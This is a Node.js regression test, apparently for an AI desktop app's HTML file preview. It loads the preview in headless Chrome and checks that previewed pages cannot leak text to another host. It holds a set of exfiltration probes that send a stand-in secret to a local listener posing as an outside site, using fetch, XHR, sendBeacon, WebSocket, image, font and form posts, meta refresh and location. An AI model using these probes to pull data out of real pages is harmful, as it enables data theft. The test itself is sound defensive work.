#!/usr/bin/env node

/**
 * Regression test for #507: a page shown in the HTML preview must not be able
 * to send anything to another website.
 *
 * read_file, write_file and edit_block show an .html file in the file preview
 * rendered, with its scripts running: renderHtmlPreview() puts the file into a
 * srcdoc iframe sandboxed with allow-scripts allow-forms allow-popups. The
 * sandbox keeps the page away from the app and the host, but not from the
 * network, and the preview sets no Content-Security-Policy of its own, so the
 * page can send its text (or whatever the user types into it) to any host,
 * unless the AI app happens to set a policy that stops it.
 *
 * The test renders previews the way the app does (renderHtmlPreview), one
 * preview frame per way out, puts them into the file preview's own document
 * as the server serves it (getFilePreviewResourceText), and loads that in
 * headless Chrome with no policy from a host, as in a host that sets none. So
 * a policy counts wherever Desktop Commander sets it: on the preview frame or
 * on its own document, which the srcdoc frames inherit. A local HTTP server on
 * another port stands for "another website" and records every request it gets.
 *
 * Cases:
 *   - requests: fetch, XMLHttpRequest, sendBeacon, WebSocket, EventSource, an
 *     image, a CSS background image, a script, a stylesheet, a web font, a
 *     video, a prefetch link, a nested frame and a form post into a frame
 *     reach nobody
 *   - navigation: the page navigating its own frame there (location, meta
 *     refresh, a form posted into its own frame) reaches nobody
 *
 * A popup (window.open, a link with target=_blank) is not a case: it needs a
 * click, and a Content-Security-Policy does not stop it.
 *
 * Every preview frame must load, so a preview that never rendered cannot pass.
 * Chrome is found the way the PDF render finds it (Desktop Commander's cached
 * Chrome for Testing, else the system's), without installing one; the test is
 * skipped when there is none.
 */

import assert from 'assert';
import { spawn } from 'child_process';
import fs from 'fs';
import http from 'http';
import os from 'os';
import path from 'path';

import { renderHtmlPreview } from '../dist/ui/file-preview/src/components/html-renderer.js';
import { getFilePreviewResourceText } from '../dist/ui/resources.js';
import { findPuppeteerChrome, findSystemChrome } from '../dist/tools/pdf/markdown.js';
import { runIfMain, skip } from './helpers/run-if-main.js';
import { createTempDir } from './helpers/test-env.js';

/** Text of the previewed file that must not leave the preview */
const SECRET = 'text-of-the-previewed-file';
/** Longest a Chrome run may take before the test gives up on it */
const CHROME_LIMIT_MS = 30_000;

/** Ways a request can leave the page; each gets its own preview frame */
const REQUEST_PROBES = {
    fetch: (to) => `<script>fetch('${to}/fetch', { method: 'POST', body: document.body.innerText }).catch(() => {})</script><p>${SECRET}</p>`,
    xhr: (to) => `<script>const x = new XMLHttpRequest(); x.open('POST', '${to}/xhr'); x.send('${SECRET}')</script>`,
    beacon: (to) => `<script>try { navigator.sendBeacon('${to}/beacon', '${SECRET}') } catch {}</script>`,
    websocket: (to) => `<script>try { new WebSocket('${to.replace('http:', 'ws:')}/websocket') } catch {}</script>`,
    eventsource: (to) => `<script>try { new EventSource('${to}/eventsource?d=${SECRET}') } catch {}</script>`,
    image: (to) => `<img src="${to}/image?d=${SECRET}">`,
    'css-image': (to) => `<div style="background: url('${to}/css-image?d=${SECRET}'); width: 8px; height: 8px"></div>`,
    script: (to) => `<script src="${to}/script?d=${SECRET}"></script>`,
    stylesheet: (to) => `<link rel="stylesheet" href="${to}/stylesheet?d=${SECRET}">`,
    font: (to) => `<style>@font-face { font-family: probe; src: url('${to}/font?d=${SECRET}') }</style><p style="font-family: probe">${SECRET}</p>`,
    video: (to) => `<video src="${to}/video?d=${SECRET}" preload="auto"></video>`,
    prefetch: (to) => `<link rel="prefetch" href="${to}/prefetch?d=${SECRET}">`,
    frame: (to) => `<iframe src="${to}/frame?d=${SECRET}"></iframe>`,
    form: (to) => `<iframe name="sink"></iframe><form method="POST" action="${to}/form" target="sink"><input name="d" value="${SECRET}"></form><script>document.forms[0].submit()</script>`,
};

/** Ways the page can navigate its own frame to another host */
const NAVIGATION_PROBES = {
    location: (to) => `<script>location.href = '${to}/location?d=${SECRET}'</script>`,
    'meta-refresh': (to) => `<meta http-equiv="refresh" content="0;url=${to}/meta-refresh?d=${SECRET}">`,
    'form-self': (to) => `<form method="POST" action="${to}/form-self"><input name="d" value="${SECRET}"></form><script>document.forms[0].submit()</script>`,
};

/** A server that records the path of every request it gets, WebSocket upgrades included */
async function startListener() {
    const reached = new Set();
    const server = http.createServer((req, res) => {
        reached.add(new URL(req.url, 'http://listener').pathname.slice(1));
        req.resume();
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.end('ok');
    });
    server.on('upgrade', (req, socket) => {
        reached.add(new URL(req.url, 'http://listener').pathname.slice(1));
        socket.destroy();
    });
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
    return { url: `http://127.0.0.1:${server.address().port}`, reached, server };
}

/**
 * The file preview's document as the server serves it, with one preview per
 * probe added at the top of its body (outside #app, which its runtime
 * renders into), each made by renderHtmlPreview() like the app makes it. It
 * lists in #loaded every preview frame that loaded.
 */
async function buildPreviewDocument(probes, listenerUrl) {
    const previews = Object.entries(probes)
        .map(([name, probe]) => `<section data-probe="${name}">${renderHtmlPreview(probe(listenerUrl), 'rendered').html}</section>`)
        .join('\n');
    const previewDocument = await getFilePreviewResourceText();
    assert.ok(/<body[^>]*>/i.test(previewDocument), 'the file preview document has a <body>');
    return previewDocument.replace(/<body[^>]*>/i, (body) => `${body}<pre id="loaded"></pre>
<script>
const loaded = new Set();
// load does not bubble: listen in the capture phase, before the frames exist
document.addEventListener('load', (event) => {
    if (event.target.classList?.contains('html-rendered-frame')) {
        loaded.add(event.target.closest('section').dataset.probe);
        document.getElementById('loaded').textContent = [...loaded].join(',');
    }
}, true);
</script>
${previews}`);
}

/**
 * Loads the page in headless Chrome until it has settled and returns the
 * probes whose preview frame loaded.
 */
async function loadInChrome(chromePath, html) {
    const host = http.createServer((req, res) => {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.end(html);
    });
    await new Promise((resolve) => host.listen(0, '127.0.0.1', resolve));
    const profileDir = createTempDir('dc-test-html-preview-chrome-');
    try {
        const args = [
            '--headless',
            '--disable-gpu',
            '--no-first-run',
            '--no-default-browser-check',
            // The runner's temporary home has no login keychain: without a mock one, macOS Chrome waits
            // for it and prints nothing (puppeteer passes the same flag)
            '--use-mock-keychain',
            `--user-data-dir=${profileDir}`,
            // Virtual time waits for the page's own requests, so every probe has run when Chrome prints the DOM
            '--virtual-time-budget=5000',
            '--dump-dom',
            `http://127.0.0.1:${host.address().port}/`,
        ];
        if (process.platform === 'linux' && process.getuid?.() === 0) {
            args.unshift('--no-sandbox');
        }
        const chrome = spawn(chromePath, args, { stdio: ['ignore', 'pipe', 'ignore'] });
        let dom = '';
        chrome.stdout.on('data', (chunk) => { dom += chunk; });
        const timer = setTimeout(() => chrome.kill(), CHROME_LIMIT_MS);
        const code = await new Promise((resolve) => chrome.on('exit', resolve));
        clearTimeout(timer);
        assert.ok(dom.includes('id="loaded"'), `Chrome printed no page (exit code ${code})`);
        // Requests still on their way to the listener
        await new Promise((resolve) => setTimeout(resolve, 300));
        const loaded = (dom.match(/<pre id="loaded">([^<]*)<\/pre>/) ?? [, ''])[1];
        return new Set(loaded.split(',').filter(Boolean));
    } finally {
        host.close();
        fs.rmSync(profileDir, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
    }
}

async function assertNothingLeaves(chromePath, caseName, probes) {
    const listener = await startListener();
    try {
        const loaded = await loadInChrome(chromePath, await buildPreviewDocument(probes, listener.url));
        const names = Object.keys(probes);
        assert.deepStrictEqual(names.filter((name) => !loaded.has(name)), [],
            `${caseName}: every preview frame should load`);
        const leaked = names.filter((name) => listener.reached.has(name));
        assert.deepStrictEqual(leaked, [],
            `${caseName}: the previewed page reached another host by ${leaked.join(', ')}`);
        console.log(`✓ ${caseName}: ${names.join(', ')} reach no other host`);
    } finally {
        listener.server.close();
    }
}

export default async function runTests() {
    // getChromePath()'s order, minus its last resort (installing Chrome)
    const chromePath = findPuppeteerChrome()?.executablePath ?? findSystemChrome();
    if (!chromePath) {
        return skip('HTML preview network: no Chrome or Chromium installed');
    }

    let failed = false;
    for (const [caseName, probes] of [['requests', REQUEST_PROBES], ['navigation', NAVIGATION_PROBES]]) {
        try {
            await assertNothingLeaves(chromePath, caseName, probes);
        } catch (error) {
            failed = true;
            console.error(`✗ ${error.message}`);
        }
    }
    if (failed) {
        return false;
    }
    console.log('\n✅ HTML preview network tests passed!');
    return true;
}

runIfMain(import.meta.url, runTests);
